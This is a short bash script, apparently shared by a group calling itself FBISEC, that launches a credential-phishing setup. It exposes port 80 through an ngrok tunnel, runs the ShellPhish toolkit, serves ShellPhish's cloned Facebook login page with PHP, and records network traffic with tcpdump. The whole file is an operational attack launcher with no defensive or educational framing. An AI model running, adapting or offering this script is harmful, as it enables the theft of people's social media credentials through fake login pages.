#!/bin/bash
#Credit goes to chillvibes && the squad at FBISEC  for the creation of this script
xterm -title "ngrok" -e " sudo ngrok http 80" &

xterm -hold -title "shellphish" -e "cd ShellPhish && sudo bash shellphish.sh" &

xterm -title "php" -e "cd /home/live/ShellPhish/sites/facebook && sudo php -S 0.0.0.0:80" &

xterm -title "tcpdump" -e "sudo tcpdump -w shellphish.pcap"
